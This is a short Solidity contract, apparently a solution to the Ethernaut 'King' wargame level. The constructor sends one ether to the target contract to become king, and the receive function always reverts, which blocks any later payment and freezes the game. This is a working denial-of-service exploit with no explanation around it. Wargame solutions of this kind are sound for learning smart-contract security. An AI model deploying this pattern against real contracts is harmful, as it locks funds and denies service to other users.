pragma solidity ^0.6.0;

contract KingForever {
    
    //Where KingContract is the targeted address you get from ethernaut
    constructor(address payable KingContract) payable public {
        KingContract.call.value(1000000000000000000).gas(4000000)("");
    }
    
    receive() payable external{
        revert();
    }
    
    function retreive() public {
        msg.sender.transfer(address(this).balance);
    }
}